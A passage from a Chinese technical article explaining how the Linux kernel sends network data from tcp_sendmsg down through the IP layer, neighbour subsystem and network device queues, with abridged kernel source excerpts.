中，调用将会由系统调用进入到协议栈，我们来看它的源码。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/socket.c<br>static inline int __sock_sendmsg_nosec(...)<br>&#123;<br> ......<br> return sock-&gt;ops-&gt;sendmsg(iocb, sock, msg, size);<br>&#125;<br></code></pre></td></tr></table></figure><p>通过第三节里的 socket 内核对象结构图，我们可以看到，这里调用的是 sock-&gt;ops-&gt;sendmsg 实际执行的是 inet_sendmsg。这个函数是 AF_INET 协议族提供的通用发送函数。</p><h3 id="4-2-传输层处理"><a href="#4-2-传输层处理" class="headerlink" title="4.2 传输层处理"></a><strong>4.2 传输层处理</strong></h3><h3 id="1）传输层拷贝"><a href="#1）传输层拷贝" class="headerlink" title="1）传输层拷贝"></a><strong>1）传输层拷贝</strong></h3><p>在进入到协议栈 inet_sendmsg 以后，内核接着会找到 socket 上的具体协议发送函数。对于 TCP 协议来说，那就是 tcp_sendmsg（同样也是通过 socket 内核对象找到的）。</p><p>在这个函数中，内核会申请一个内核态的 skb 内存，将用户待发送的数据拷贝进去。注意这个时候不一定会真正开始发送，如果没有达到发送条件的话很可能这次调用直接就返回了。大概过程如图：</p><p><img src="https://pic2.zhimg.com/80/v2-ffad55e8c65199c7c6604bd394088e41_1440w.webp" alt="img"></p><p>我们来看 inet_sendmsg 函数的源码。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/af_inet.c<br>int inet_sendmsg(......)<br>&#123;<br> ......<br> return sk-&gt;sk_prot-&gt;sendmsg(iocb, sk, msg, size);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个函数中会调用到具体协议的发送函数。同样参考第三节里的 socket 内核对象结构图，我们看到对于 TCP 协议下的 socket 来说，来说 sk-&gt;sk_prot-&gt;sendmsg 指向的是 tcp_sendmsg（对于 UPD 来说是 udp_sendmsg）。</p><p>tcp_sendmsg 这个函数比较长，我们分多次来看它。 先看这一段</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/tcp.c<br>int tcp_sendmsg(...)<br>&#123;<br> while(...)&#123;<br>  while(...)&#123;<br>   //获取发送队列<br>   skb = tcp_write_queue_tail(sk);<br><br>   //申请skb 并拷贝<br>   ......<br>  &#125;<br> &#125;<br>&#125;<br><br>//file: include/net/tcp.h<br>static inline struct sk_buff *tcp_write_queue_tail(const struct sock *sk)<br>&#123;<br> return skb_peek_tail(&amp;sk-&gt;sk_write_queue);<br>&#125;<br></code></pre></td></tr></table></figure><p>理解对 socket 调用 tcp_write_queue_tail 是理解发送的前提。如上所示，这个函数是在获取 socket 发送队列中的最后一个 skb。 skb 是 struct sk_buff 对象的简称，用户的发送队列就是该对象组成的一个链表。</p><p><img src="https://pic2.zhimg.com/80/v2-bb693e4a2fdae5870609d9b76133c0ad_1440w.webp" alt="img"></p><p>我们再接着看 tcp_sendmsg 的其它部分。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/tcp.c<br>int tcp_sendmsg(struct kiocb *iocb, struct sock *sk, struct msghdr *msg,<br>  size_t size)<br>&#123;<br> //获取用户传递过来的数据和标志<br> iov = msg-&gt;msg_iov; //用户数据地址<br> iovlen = msg-&gt;msg_iovlen; //数据块数为1<br> flags = msg-&gt;msg_flags; //各种标志<br><br> //遍历用户层的数据块<br> while (--iovlen &gt;= 0) &#123;<br><br>  //待发送数据块的地址<br>  unsigned char __user *from = iov-&gt;iov_base;<br><br>  while (seglen &gt; 0) &#123;<br><br>   //需要申请新的 skb<br>   if (copy &lt;= 0) &#123;<br><br>    //申请 skb，并添加到发送队列的尾部<br>    skb = sk_stream_alloc_skb(sk,<br>         select_size(sk, sg),<br>         sk-&gt;sk_allocation);<br><br>    //把 skb 挂到socket的发送队列上<br>    skb_entail(sk, skb);<br>   &#125;<br><br>   // skb 中有足够的空间<br>   if (skb_availroom(skb) &gt; 0) &#123;<br>    //拷贝用户空间的数据到内核空间，同时计算校验和<br>    //from是用户空间的数据地址 <br>    skb_add_data_nocache(sk, skb, from, copy);<br>   &#125; <br>   ......<br></code></pre></td></tr></table></figure><p>这个函数比较长，不过其实逻辑并不复杂。其中 msg-&gt;msg_iov 存储的是用户态内存的要发送的数据的 buffer。接下来在内核态申请内核内存，比如 skb，并把用户内存里的数据拷贝到内核态内存中。<strong>这就会涉及到一次或者几次内存拷贝的开销</strong>。</p><p><img src="https://pic3.zhimg.com/80/v2-cbd951cef795058fe8379ac46765d172_1440w.webp" alt="img"></p><p>至于内核什么时候真正把 skb 发送出去。在 tcp_sendmsg 中会进行一些判断。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/tcp.c<br>int tcp_sendmsg(...)<br>&#123;<br> while(...)&#123;<br>  while(...)&#123;<br>   //申请内核内存并进行拷贝<br><br>   //发送判断<br>   if (forced_push(tp)) &#123;<br>    tcp_mark_push(tp, skb);<br>    __tcp_push_pending_frames(sk, mss_now, TCP_NAGLE_PUSH);<br>   &#125; else if (skb == tcp_send_head(sk))<br>    tcp_push_one(sk, mss_now);  <br>   &#125;<br>   continue;<br>  &#125;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>只有满足 forced_push(tp) 或者 skb &#x3D;&#x3D; tcp_send_head(sk) 成立的时候，内核才会真正启动发送数据包。其中 forced_push(tp) 判断的是未发送的数据数据是否已经超过最大窗口的一半了。</p><p>条件都不满足的话，<strong>这次的用户要发送的数据只是拷贝到内核就算完事了！</strong></p><h3 id="2）传输层发送"><a href="#2）传输层发送" class="headerlink" title="2）传输层发送"></a><strong>2）传输层发送</strong></h3><p>假设现在内核发送条件已经满足了，我们再来跟踪一下实际的发送过程。 对于上小节函数中，当满足真正发送条件的时候，无论调用的是 __tcp_push_pending_frames 还是 tcp_push_one 最终都实际会执行到 tcp_write_xmit。</p><p>所以我们直接从 tcp_write_xmit 看起，这个函数处理了传输层的拥塞控制、滑动窗口相关的工作。满足窗口要求的时候，设置一下 TCP 头然后将 skb 传到更低的网络层进行处理。</p><p><img src="https://pic2.zhimg.com/80/v2-18f6157c989ac8838e7048941260809d_1440w.webp" alt="img"></p><p>我们来看下 tcp_write_xmit 的源码。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/tcp_output.c<br>static bool tcp_write_xmit(struct sock *sk, unsigned int mss_now, int nonagle,<br>      int push_one, gfp_t gfp)<br>&#123;<br> //循环获取待发送 skb<br> while ((skb = tcp_send_head(sk))) <br> &#123;<br>  //滑动窗口相关<br>  cwnd_quota = tcp_cwnd_test(tp, skb);<br>  tcp_snd_wnd_test(tp, skb, mss_now);<br>  tcp_mss_split_point(...);<br>  tso_fragment(sk, skb, ...);<br>  ......<br><br>  //真正开启发送<br>  tcp_transmit_skb(sk, skb, 1, gfp);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到我们之前在网络协议里学的滑动窗口、拥塞控制就是在这个函数中完成的，这部分就不过多展开了，感兴趣同学自己找这段源码来读。我们今天只看发送主过程，那就走到了 tcp_transmit_skb。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/tcp_output.c<br>static int tcp_transmit_skb(struct sock *sk, struct sk_buff *skb, int clone_it,<br>    gfp_t gfp_mask)<br>&#123;<br> //1.克隆新 skb 出来<br> if (likely(clone_it)) &#123;<br>  skb = skb_clone(skb, gfp_mask);<br>  ......<br> &#125;<br><br> //2.封装 TCP 头<br> th = tcp_hdr(skb);<br> th-&gt;source  = inet-&gt;inet_sport;<br> th-&gt;dest  = inet-&gt;inet_dport;<br> th-&gt;window  = ...;<br> th-&gt;urg   = ...;<br> ......<br><br> //3.调用网络层发送接口<br> err = icsk-&gt;icsk_af_ops-&gt;queue_xmit(skb, &amp;inet-&gt;cork.fl);<br>&#125;<br></code></pre></td></tr></table></figure><p>第一件事是先克隆一个新的 skb，这里重点说下为什么要复制一个 skb 出来呢？</p><p>是因为 skb 后续在调用网络层，最后到达网卡发送完成的时候，这个 skb 会被释放掉。而我们知道 TCP 协议是支持丢失重传的，在收到对方的 ACK 之前，这个 skb 不能被删除。所以内核的做法就是每次调用网卡发送的时候，实际上传递出去的是 skb 的一个拷贝。等收到 ACK 再真正删除。</p><p>第二件事是修改 skb 中的 TCP header，根据实际情况把 TCP 头设置好。这里要介绍一个小技巧，skb 内部其实包含了网络协议中所有的 header。在设置 TCP 头的时候，只是把指针指向 skb 的合适位置。后面再设置 IP 头的时候，在把指针挪一挪就行，避免频繁的内存申请和拷贝，效率很高。</p><p><img src="https://pic4.zhimg.com/80/v2-cfce7d6f807c3325de9ef21df529e4c3_1440w.webp" alt="img"></p><p>tcp_transmit_skb 是发送数据位于传输层的最后一步，接下来就可以进入到网络层进行下一层的操作了。调用了网络层提供的发送接口icsk-&gt;icsk_af_ops-&gt;queue_xmit()。</p><p>在下面的这个源码中，我们的知道了 queue_xmit 其实指向的是 ip_queue_xmit 函数。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/tcp_ipv4.c<br>const struct inet_connection_sock_af_ops ipv4_specific = &#123;<br> .queue_xmit    = ip_queue_xmit,<br> .send_check    = tcp_v4_send_check,<br> ...<br>&#125;<br></code></pre></td></tr></table></figure><p>自此，传输层的工作也就都完成了。 数据离开了传输层，接下来将会进入到内核在网络层的实现里。</p><h3 id="4-3-网络层发送处理"><a href="#4-3-网络层发送处理" class="headerlink" title="4.3 网络层发送处理"></a><strong>4.3 网络层发送处理</strong></h3><p>Linux 内核网络层的发送的实现位于 net&#x2F;ipv4&#x2F;ip_output.c 这个文件。传输层调用到的 ip_queue_xmit 也在这里。（从文件名上也能看出来进入到 IP 层了，源文件名已经从 tcp_xxx 变成了 ip_xxx。）</p><p>在网络层里主要处理路由项查找、IP 头设置、netfilter 过滤、skb 切分（大于 MTU 的话）等几项工作，处理完这些工作后会交给更下层的邻居子系统来处理。</p><p><img src="https://pic1.zhimg.com/80/v2-0070e8bac1946baba239c56a27555a00_1440w.webp" alt="img"></p><p>我们来看网络层入口函数 ip_queue_xmit 的源码：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/ip_output.c<br>int ip_queue_xmit(struct sk_buff *skb, struct flowi *fl)<br>&#123;<br> //检查 socket 中是否有缓存的路由表<br> rt = (struct rtable *)__sk_dst_check(sk, 0);<br> if (rt == NULL) &#123;<br>  //没有缓存则展开查找<br>  //则查找路由项， 并缓存到 socket 中<br>  rt = ip_route_output_ports(...);<br>  sk_setup_caps(sk, &amp;rt-&gt;dst);<br> &#125;<br><br> //为 skb 设置路由表<br> skb_dst_set_noref(skb, &amp;rt-&gt;dst);<br><br> //设置 IP header<br> iph = ip_hdr(skb);<br> iph-&gt;protocol = sk-&gt;sk_protocol;<br> iph-&gt;ttl      = ip_select_ttl(inet, &amp;rt-&gt;dst);<br> iph-&gt;frag_off = ...;<br><br> //发送<br> ip_local_out(skb);<br>&#125;<br></code></pre></td></tr></table></figure><p>ip_queue_xmit 已经到了网络层，在这个函数里我们看到了网络层相关的功能路由项查找，如果找到了则设置到 skb 上（没有路由的话就直接报错返回了）。</p><p>在 Linux 上通过 route 命令可以看到你本机的路由配置。</p><p><img src="https://pic2.zhimg.com/80/v2-026979a5417056df4cd921841ce4cb61_1440w.webp" alt="img"></p><p>在路由表中，可以查到某个目的网络应该通过哪个 Iface（网卡），哪个 Gateway（网卡）发送出去。查找出来以后缓存到 socket 上，下次再发送数据就不用查了。</p><p>接着把路由表地址也放到 skb 里去。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: include/linux/skbuff.h<br>struct sk_buff &#123;<br> //保存了一些路由相关信息<br> unsigned long  _skb_refdst;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来就是定位到 skb 里的 IP 头的位置上，然后开始按照协议规范设置 IP header。</p><p><img src="https://pic3.zhimg.com/80/v2-f75b423219d405ff7c6885b10ee11c0a_1440w.webp" alt="img"></p><p>再通过 ip_local_out 进入到下一步的处理。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/ip_output.c  <br>int ip_local_out(struct sk_buff *skb)<br>&#123;<br> //执行 netfilter 过滤<br> err = __ip_local_out(skb);<br><br> //开始发送数据<br> if (likely(err == 1))<br>  err = dst_output(skb);<br> ......<br></code></pre></td></tr></table></figure><p>在 ip_local_out &#x3D;&gt; __ip_local_out &#x3D;&gt; nf_hook 会执行 netfilter 过滤。如果你使用 iptables 配置了一些规则，那么这里将检测是否命中规则。 <strong>如果你设置了非常复杂的 netfilter 规则，在这个函数这里将会导致你的进程 CPU 开销会极大增加</strong>。</p><p>还是不多展开说，继续只聊和发送有关的过程 dst_output。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: include/net/dst.h<br>static inline int dst_output(struct sk_buff *skb)<br>&#123;<br> return skb_dst(skb)-&gt;output(skb);<br>&#125;<br></code></pre></td></tr></table></figure><p>此函数找到到这个 skb 的路由表（dst 条目） ，然后调用路由表的 output 方法。这又是一个函数指针，指向的是 ip_output 方法。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/ip_output.c<br>int ip_output(struct sk_buff *skb)<br>&#123;<br> //统计<br> .....<br><br> //再次交给 netfilter，完毕后回调 ip_finish_output<br> return NF_HOOK_COND(NFPROTO_IPV4, NF_INET_POST_ROUTING, skb, NULL, dev,<br>    ip_finish_output,<br>    !(IPCB(skb)-&gt;flags &amp; IPSKB_REROUTED));<br>&#125;<br></code></pre></td></tr></table></figure><p>在 ip_output 中进行一些简单的，统计工作，再次执行 netfilter 过滤。过滤通过之后回调 ip_finish_output。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/ip_output.c<br>static int ip_finish_output(struct sk_buff *skb)<br>&#123;<br> //大于 mtu 的话就要进行分片了<br> if (skb-&gt;len &gt; ip_skb_dst_mtu(skb) &amp;&amp; !skb_is_gso(skb))<br>  return ip_fragment(skb, ip_finish_output2);<br> else<br>  return ip_finish_output2(skb);<br>&#125;<br></code></pre></td></tr></table></figure><p>在 ip_finish_output 中我们看到，<strong>如果数据大于 MTU 的话，是会执行分片的。</strong></p><blockquote><p>实际 MTU 大小确定依赖 MTU 发现，以太网帧为 1500 字节。之前 QQ 团队在早期的时候，会尽量控制自己数据包尺寸小于 MTU，通过这种方式来优化网络性能。因为分片会带来两个问题：1、需要进行额外的切分处理，有额外性能开销。2、只要一个分片丢失，整个包都得重传。所以避免分片既杜绝了分片开销，也大大降低了重传率。</p></blockquote><p>在 ip_finish_output2 中，终于发送过程会进入到下一层，邻居子系统中。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/ipv4/ip_output.c<br>static inline int ip_finish_output2(struct sk_buff *skb)<br>&#123;<br> //根据下一跳 IP 地址查找邻居项，找不到就创建一个<br> nexthop = (__force u32) rt_nexthop(rt, ip_hdr(skb)-&gt;daddr);  <br> neigh = __ipv4_neigh_lookup_noref(dev, nexthop);<br> if (unlikely(!neigh))<br>  neigh = __neigh_create(&amp;arp_tbl, &amp;nexthop, dev, false);<br><br> //继续向下层传递<br> int res = dst_neigh_output(dst, neigh, skb);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-4-邻居子系统"><a href="#4-4-邻居子系统" class="headerlink" title="4.4 邻居子系统"></a><strong>4.4 邻居子系统</strong></h3><p>邻居子系统是位于网络层和数据链路层中间的一个系统，其作用是对网络层提供一个封装，让网络层不必关心下层的地址信息，让下层来决定发送到哪个 MAC 地址。</p><p>而且这个邻居子系统并不位于协议栈 net&#x2F;ipv4&#x2F; 目录内，而是位于 net&#x2F;core&#x2F;neighbour.c。因为无论是对于 IPv4 还是 IPv6 ，都需要使用该模块。</p><p><img src="https://pic2.zhimg.com/80/v2-980285236de5b4b2efcf7176d1d6f9d9_1440w.webp" alt="img"></p><p>在邻居子系统里主要是查找或者创建邻居项，在创造邻居项的时候，有可能会发出实际的 arp 请求。然后封装一下 MAC 头，将发送过程再传递到更下层的网络设备子系统。大致流程如图。</p><p><img src="https://pic4.zhimg.com/80/v2-c2fffa7864d22f96118c7ce39ead1057_1440w.webp" alt="img"></p><p>理解了大致流程，我们再回头看源码。在上面小节 ip_finish_output2 源码中调用了 __ipv4_neigh_lookup_noref。它是在 arp 缓存中进行查找，其第二个参数传入的是路由下一跳 IP 信息。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: include/net/arp.h<br>extern struct neigh_table arp_tbl;<br>static inline struct neighbour *__ipv4_neigh_lookup_noref(<br> struct net_device *dev, u32 key)<br>&#123;<br> struct neigh_hash_table *nht = rcu_dereference_bh(arp_tbl.nht);<br><br> //计算 hash 值，加速查找<br> hash_val = arp_hashfn(......);<br> for (n = rcu_dereference_bh(nht-&gt;hash_buckets[hash_val]);<br>   n != NULL;<br>   n = rcu_dereference_bh(n-&gt;next)) &#123;<br>  if (n-&gt;dev == dev &amp;&amp; *(u32 *)n-&gt;primary_key == key)<br>   return n;<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>如果查找不到，则调用 __neigh_create 创建一个邻居。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/core/neighbour.c<br>struct neighbour *__neigh_create(......)<br>&#123;<br> //申请邻居表项<br> struct neighbour *n1, *rc, *n = neigh_alloc(tbl, dev);<br><br> //构造赋值<br> memcpy(n-&gt;primary_key, pkey, key_len);<br> n-&gt;dev = dev;<br> n-&gt;parms-&gt;neigh_setup(n);<br><br> //最后添加到邻居 hashtable 中<br> rcu_assign_pointer(nht-&gt;hash_buckets[hash_val], n);<br> ......<br></code></pre></td></tr></table></figure><p>有了邻居项以后，此时仍然还不具备发送 IP 报文的能力，因为目的 MAC 地址还未获取。 调用 dst_neigh_output 继续传递 skb。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: include/net/dst.h<br>static inline int dst_neigh_output(struct dst_entry *dst, <br>     struct neighbour *n, struct sk_buff *skb)<br>&#123;<br> ......<br> return n-&gt;output(n, skb);<br>&#125;<br></code></pre></td></tr></table></figure><p>调用 output，实际指向的是 neigh_resolve_output。在这个函数内部有可能会发出 arp 网络请求。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/core/neighbour.c<br>int neigh_resolve_output()&#123;<br><br> //注意：这里可能会触发 arp 请求<br> if (!neigh_event_send(neigh, skb)) &#123;<br><br>  //neigh-&gt;ha 是 MAC 地址<br>  dev_hard_header(skb, dev, ntohs(skb-&gt;protocol),<br>           neigh-&gt;ha, NULL, skb-&gt;len);<br>  //发送<br>  dev_queue_xmit(skb);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>当获取到硬件 MAC 地址以后，就可以封装 skb 的 MAC 头了。最后调用 dev_queue_xmit 将 skb 传递给 Linux 网络设备子系统。</p><h3 id="4-5-网络设备子系统"><a href="#4-5-网络设备子系统" class="headerlink" title="4.5 网络设备子系统"></a><strong>4.5 网络设备子系统</strong></h3><p><img src="https://pic4.zhimg.com/80/v2-6fa56c1f95237a49703f6a0161daa7e3_1440w.webp" alt="img"></p><p>邻居子系统通过 dev_queue_xmit 进入到网络设备子系统中来。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/core/dev.c <br>int dev_queue_xmit(struct sk_buff *skb)<br>&#123;<br> //选择发送队列<br> txq = netdev_pick_tx(dev, skb);<br><br> //获取与此队列关联的排队规则<br> q = rcu_dereference_bh(txq-&gt;qdisc);<br><br> //如果有队列，则调用__dev_xmit_skb 继续处理数据<br> if (q-&gt;enqueue) &#123;<br>  rc = __dev_xmit_skb(skb, q, dev, txq);<br>  goto out;<br> &#125;<br><br> //没有队列的是回环设备和隧道设备<br> ......<br>&#125;<br></code></pre></td></tr></table></figure><p>开篇第二节网卡启动准备里我们说过，网卡是有多个发送队列的（尤其是现在的网卡）。上面对 netdev_pick_tx 函数的调用就是选择一个队列进行发送。</p><p>netdev_pick_tx 发送队列的选择受 XPS 等配置的影响，而且还有缓存，也是一套小复杂的逻辑。这里我们只关注两个逻辑，首先会获取用户的 XPS 配置，否则就自动计算了。代码见 netdev_pick_tx &#x3D;&gt; __netdev_pick_tx。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/core/flow_dissector.c<br>u16 __netdev_pick_tx(struct net_device *dev, struct sk_buff *skb)<br>&#123;<br> //获取 XPS 配置<br> int new_index = get_xps_queue(dev, skb);<br><br> //自动计算队列<br> if (new_index &lt; 0)<br>  new_index = skb_tx_hash(dev, skb);&#125;<br></code></pre></td></tr></table></figure><p>然后获取与此队列关联的 qdisc。在 linux 上通过 tc 命令可以看到 qdisc 类型，例如对于我的某台多队列网卡机器上是 mq disc。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">#tc qdisc<br>qdisc mq 0: dev eth0 root<br></code></pre></td></tr></table></figure><p>大部分的设备都有队列（回环设备和隧道设备除外），所以现在我们进入到 __dev_xmit_skb。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">//file: net/core/dev.c<br>static inline int __dev_xmit_skb(struct sk_buff *skb, struct Qdisc *q,<br>     struct net_device *dev,<br>     struct netdev_queue *txq)<br>&#123;<br> //1.如果可以绕开排队系统<br> if ((q-&gt;flags &amp; TCQ_F_CAN_BYPASS) &amp;&amp; !qdisc_qlen(q) &amp;&amp;<br>     qdisc_run_begin(q)) &#123;<br>  ......<br> &#125;<br><br> //2.正常排队<br> else &#123;<br><br>  //入队<br>  q-&gt;enqueue(skb, q)<br><br>  //开始发送<br>  __qdisc_run(q);<br> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>上述代码中分两种情况，1 是可以 bypass（绕过）排队系统的，另外一种是正常排队。我们只看第二种情况。</p><p>先调用 q-&gt;enqueue 把 skb 添加到队列里。然后调用 __qdisc_run 开始发送。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 